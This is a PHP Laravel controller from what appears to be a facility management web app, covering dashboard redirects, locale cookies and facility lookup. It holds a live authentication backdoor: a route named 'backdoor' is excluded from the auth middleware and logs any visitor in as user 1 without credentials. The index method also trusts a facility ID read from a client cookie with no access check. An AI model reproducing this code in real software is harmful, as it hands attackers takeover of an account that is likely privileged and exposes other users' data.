<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Debugbar;
use Illuminate\Support\Facades\Auth;
use App\Domains\HubUser;
use App\Domains\UserFacility;
use App\Domains\Facility;
use App;
use Illuminate\Support\Facades\Log;
use App\Domains\UserSessionLog;
use App\User;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth', ['except'=>['backdoor']]);
    }

    public function backdoor(Request $request){
        $user = User::find(1);
        DebugBar::debug($user);
        Auth::login($user);        
    }
    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {
        Log::debug('locale is ' .App::getLocale());
        setcookie('user_locale', App::getLocale(), 0, "/");
        // if the user has selected a facility, go straight to resident view
        // otherwise the user must select a facility in home page
        $facilityId = null;
        if(array_key_exists('facility', $_COOKIE))
            $facilityId = $_COOKIE['facility'];
        if(!isset($facilityId))
            $facilityId = $request->session()->get('facility');
        else
            $request->session()->put('facility', $facilityId);
        if(!isset($facilityId)){
            return redirect('/facility/show');
        } else {
            $facility = Facility::find($facilityId);
            setcookie('FacilityName', $facility->FacilityName, 0, "/");
            setcookie('facility', $facilityId, 0, "/");
            return redirect('/dashboard');
        }
    }

    public function setlocale($locale){

        setcookie('user_locale', $locale, time()+36000, '/', NULL, 0);

        return redirect()->back();
    }

    private function getUserAndFacilities(){
        $facArray = [];
        $sid = Auth::user()->SID;

        $user = HubUser::where('SID', $sid)->get()->first();
        session(['username'=> $user->Fullname]);
//        Debugbar::debug($user);

        $userFacilities = UserFacility::where('userId', $sid)->get();
        foreach ($userFacilities as $uf){
            array_push($facArray, $uf->facilityId);
        }
        $facilities = Facility::whereIn('FacilityID', $facArray)->orderBy('NameLong')->get();

        return [
            'user' => $user,
            'facilities' => $facilities,
        ];
    }

}
